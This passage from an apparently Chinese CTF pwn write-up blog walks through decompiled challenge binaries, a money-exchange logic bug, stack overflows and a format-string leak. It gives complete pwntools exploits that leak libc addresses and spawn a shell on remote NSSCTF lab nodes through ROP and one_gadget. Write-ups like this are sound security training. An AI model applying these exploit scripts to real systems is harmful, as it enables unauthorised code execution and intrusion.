class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">flower</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> count; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which kind of flower would you like buy?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.peony $10&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.rose $100&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.fragrans $20&quot;</span>);<br>  count = read_count();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many flowers do you want to buy?&quot;</span>);<br>  v1 = read_count();<br>  <span class="hljs-keyword">switch</span> ( count )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-number">100</span> * v1 &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>      result = money - <span class="hljs-number">100</span> * v1;<br>      money = result;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-number">20</span> * v1 &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>      result = money - <span class="hljs-number">20</span> * v1;<br>      money = result;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-number">10</span> * v1 &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>      result = money - <span class="hljs-number">10</span> * v1;<br>      money = result;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choose&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_books:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">books</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> count; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which kind of books would you like buy?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.story books $10&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.novel books $80&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.note books $20&quot;</span>);<br>  count = read_count();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many books do you want to buy?&quot;</span>);<br>  v1 = read_count();<br>  <span class="hljs-keyword">switch</span> ( count )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-number">80</span> * v1 &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>      result = money - <span class="hljs-number">80</span> * v1;<br>      money = result;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-number">20</span> * v1 &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>      result = money - <span class="hljs-number">20</span> * v1;<br>      money = result;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-number">10</span> * v1 &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>      result = money - <span class="hljs-number">10</span> * v1;<br>      money = result;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choose&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_hell_money:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">hell_money</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1$ = 1000hell_money&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How much do you want to spend buying the hell_money?&quot;</span>);<br>  count = read_count();<br>  <span class="hljs-keyword">if</span> ( money &lt; count )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>  result = what_can_I_say + <span class="hljs-number">1000</span> * count;<br>  what_can_I_say = result;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_clothing:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">clothing</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> count; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;the price of clothing is 50$&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How much do you want to buy&quot;</span>);<br>  count = read_count();<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">50</span> * count &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t have enough money&quot;</span>);<br>  result = money - <span class="hljs-number">50</span> * count;<br>  money = result;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_shop:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shop</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-40h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Do you want to buy my shop?&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( money &lt;= <span class="hljs-number">100000</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;roll!&quot;</span>);<br>  money -= <span class="hljs-number">100000</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;give you my shop!!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You can name it!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x80u</span>LL);<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_check_money:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">check_money</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have %d $\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)money);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have %d hell_money\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)what_can_I_say);<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_see_it</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 <span class="hljs-title function_">see_it</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> count; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Barter?!1000$ = 1hell_money&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How much do you exchange?&quot;</span>);<br>  count = read_count();<br>  what_can_I_say -= count;<br>  result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(money + <span class="hljs-number">1000</span> * count);<br>  money += <span class="hljs-number">1000</span> * count;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先看到函数shop有个读的明显栈溢出漏洞，随后观察其他函数逻辑，发现这个子函数有一个编写逻辑存在问题，hell_money换钱但是不扣钱，在目录外的7又可以将另一种钱换回来，所以就有钱买店，顺利进入shop函数的读取漏洞</p><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/pwn2$ checksec attachment<br>[*] &#x27;/mnt/d/111/pwn2/attachment&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400d73 : pop rdi ; ret<br></code></pre></td></tr></table></figure><p>泄露libc基址的payload构造</p><table><thead><tr><th align="center">high_addr</th></tr></thead><tbody><tr><td align="center">start_addr</td></tr><tr><td align="center">put_plt</td></tr><tr><td align="center">puts_got</td></tr><tr><td align="center">ret_addr [ pop_rdi_ret_addr ]</td></tr><tr><td align="center">缓冲区+old_ebp</td></tr><tr><td align="center">low_addr</td></tr></tbody></table><p>构造getshell的栈的思路</p><table><thead><tr><th align="center">high_addr</th></tr></thead><tbody><tr><td align="center">ret_addr</td></tr><tr><td align="center">system_addr</td></tr><tr><td align="center">binsh_addr</td></tr><tr><td align="center">ret_addr  [ pop_rdi_ret_addr ]</td></tr><tr><td align="center">缓冲区+old_ebp</td></tr><tr><td align="center">low_addr</td></tr></tbody></table><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>f = ELF(&#x27;./attachment&#x27;)<br>p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28830)<br>#p=process(&#x27;./attachment&#x27;)<br>#进入溢出攻击位置<br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;3&#x27;)<br>p.recvuntil(b&#x27;How much do you want to spend buying the hell_money?\n&#x27;)<br>p.sendline(b&#x27;1000&#x27;)<br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;7&#x27;)<br>p.recvuntil(b&#x27;How much do you exchange?&#x27;)<br>p.sendline(b&#x27;1000000&#x27;)<br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;5&#x27;)<br>p.recvuntil(b&#x27;You can name it!!!\n&#x27;)<br>#开始栈溢出漏洞攻击<br>pop_rdi_ret_addr = 0x0000000000400d73<br>#puts_plt = 0x0400590<br>#puts_got = 0x0602018<br>#start_addr = 0x0400C4F<br>puts_plt = f.plt[&#x27;puts&#x27;] #puts函数的入口地址<br>puts_got = f.got[&#x27;puts&#x27;]  #puts函数的got表地址<br>start_addr = f.symbols[&#x27;_start&#x27;] #程序的起始地址<br><br>payload1 = b&#x27;a&#x27;*(0x40 + 0x8) + p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(start_addr)<br>p.send(payload1)<br>puts_real_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>#read函数的真实地址，由于真实地址总是从7f开始，故从7f开始接收，长度补足8个字节<br>print(&quot;puts_real_addr: &quot;, hex(puts_real_addr))<br>libc_base = puts_real_addr - libc.sym[&quot;puts&quot;]<br><br>#ret_addr = 0x00400579<br>pop_rdi_ret_addr = 0x0000000000400d73<br>system_addr = libc_base + libc.sym[&quot;system&quot;]<br>binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))<br>print(&quot;system_addr:&#123;&#125;&quot;.format(hex(system_addr)))<br>print(&quot;binsh_addr:&#123;&#125;&quot;.format(hex(binsh_addr)))<br><br>payload2 = b&#x27;a&#x27;*(0x40+0x8) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)<br><br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;5&#x27;)<br>p.sendline(payload2)<br>sleep(0.5)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>题解有点繁琐，需要学习一些大佬的模板来简化</p><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p><strong>考察知识点：ret2libc , 栈迁移 , 格式化字符串漏洞 , ogg , 在libc中找rop</strong></p><h3 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h3><p>IDA_main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  func();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_func</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">char</span> format[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h] BYREF</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+2Eh] [rbp-2h]</span><br><br>  <span class="hljs-built_in">strcpy</span>(format, <span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;give you a gift.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;show your magic&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x60u</span>LL);<br>  <span class="hljs-keyword">return</span> buf;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/ret2libc2$ checksec ret2libc2<br>[*] &#x27;/mnt/d/111/ret2libc2/ret2libc2&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>题目给了三个附件，<strong>对于一般的C程序</strong>，<strong>修改它的配置操作如下</strong>;</p><p>修改ld文件[链接器]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --set-interpreter file_path#[链接器路径]<br></code></pre></td></tr></table></figure><p>修改库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --replace-needed 原库名 新库名#[库路径]<br></code></pre></td></tr></table></figure><h3 id="shift-F12"><a href="#shift-F12" class="headerlink" title="shift+F12"></a>shift+F12</h3><p><img src="/../00000000/image-20250306200030544.png" alt="image-20250306200030544"></p><p>查看字符并没有我们想要的字符串</p><h3 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/ret2libc2$ ROPgadget --binary ./ret2libc2 --only &#x27;pop|ret&#x27;<br>Gadgets information<br>============================================================<br>0x000000000040117d : pop rbp ; ret<br>0x000000000040101a : ret<br><br>Unique gadgets found: 2<br></code></pre></td></tr></table></figure><p>并没有我们想要的</p><h3 id="汇编代码："><a href="#汇编代码：" class="headerlink" title="汇编代码："></a>汇编代码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000004011FB ; __unwind &#123;<br>.text:00000000004011FB                 endbr64<br>.text:00000000004011FF                 push    rbp<br>.text:0000000000401200                 mov     rbp, rsp<br>.text:0000000000401203                 sub     rsp, 30h<br>.text:0000000000401207                 mov     rax, 6F77206F6C6C6568h<br>.text:0000000000401211                 mov     rdx, 0A21646C72h<br>.text:000000000040121B                 mov     qword ptr [rbp+format], rax<br>.text:000000000040121F                 mov     [rbp+var_8], rdx<br>.text:0000000000401223                 lea     rax, [rbp+format]<br>.text:0000000000401227                 mov     rdi, rax        ; format<br>.text:000000000040122A                 mov     eax, 0<br>.text:000000000040122F                 call    _printf<br>.text:0000000000401234                 lea     rax, s          ; &quot;give you a gift.&quot;<br>.text:000000000040123B                 mov     rdi, rax        ; s<br>.text:000000000040123E                 call    _puts<br>.text:0000000000401243                 lea     rax, aShowYourMagic ; &quot;show your magic&quot;<br>.text:000000000040124A                 mov     rdi, rax        ; s<br>.text:000000000040124D                 call    _puts<br>.text:0000000000401252                 lea     rax, [rbp+buf]<br>.text:0000000000401256                 mov     edx, 60h ; &#x27;`&#x27;  ; nbytes<br>.text:000000000040125B                 mov     rsi, rax        ; buf<br>.text:000000000040125E                 mov     edi, 0          ; fd<br>.text:0000000000401263                 mov     eax, 0<br>.text:0000000000401268                 call    _read<br>.text:000000000040126D                 lea     rax, [rbp+buf]<br>.text:0000000000401271                 nop<br>.text:0000000000401272                 leave<br>.text:0000000000401273                 retn<br>.text:0000000000401273 ; &#125; // starts at 4011FB<br></code></pre></td></tr></table></figure><p>可以看到call结束后还会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040126D                 lea     rax, [rbp+buf]<br></code></pre></td></tr></table></figure><p>这个时候buf的地址就被加载到了rax</p><p>再控制程序跳转到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000401227                 mov     rdi, rax        ; format<br></code></pre></td></tr></table></figure><p>开始利用格式化字符串泄露地址</p><p>我们可以通过泄露__libc_start_call_main+128的地址，进而算出libc的基址</p><p>我们可以明显地观察到存在格式化字符串漏洞，在buf溢出时，也可以设定好格式化字符串的值用于地址的泄露</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br># libc = ELF(&#x27;/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br>context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]<br><br># io = process(&#x27;./ret2libc2&#x27;)<br>io = remote(&#x27;node2.anna.nssctf.cn&#x27;,28996)<br><br>def p():<br>    gdb.attach(proc.pidof(io)[0])<br><br>main = 0x401227<br>bss = 0x404000 <br><br># p()<br><br>io.recvuntil(&quot;show your magic\n&quot;)<br><br>payload = b&quot;%7$p&quot;<br>payload = payload.ljust(0x30, b&#x27;\x00&#x27;)<br>payload +=  p64(bss + 0x300) + p64(main)<br>io.send(payload)<br><br>libcbase = int(io.recv(14),16) - 0x29d90<br>success(&quot;libcbase --&gt;&quot; + hex(libcbase))<br><br>one_gadget = libcbase + 0xebc81<br><br>io.recvuntil(&quot;show your magic\n&quot;)<br>payload = b&quot;a&quot;*0x30 + p64(bss + 0x300) + p64(one_gadget)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="真会布置栈吗？"><a href="#真会布置栈吗？" class="headerlink" title="真会布置栈吗？"></a>真会布置栈吗？</h2><h3 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/pwn4$ checksec attachment<br>[*] &#x27;/mnt/d/111/pwn4/attachment&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No 